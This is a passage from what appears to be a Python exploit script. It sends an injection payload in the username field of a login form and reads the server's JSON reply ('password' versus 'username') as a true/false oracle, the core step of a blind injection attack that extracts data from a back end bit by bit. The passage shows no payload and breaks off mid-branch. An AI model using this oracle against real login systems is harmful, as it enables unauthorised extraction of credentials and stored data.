    data = {
        "username": payload,
        "password": "dummy",
        "submit": "Login"
    }
    try:
        response = requests.post(base_url, data=data, cookies=session_cookie, timeout=10)
        # TRUE condition: response contains {"response":"password"}
        # FALSE condition: response contains {"response":"username"}
        if '{"response":"password"}' in response.text:
            return True
        elif '{"response":"username"}' in response.text:
            return False
        else:
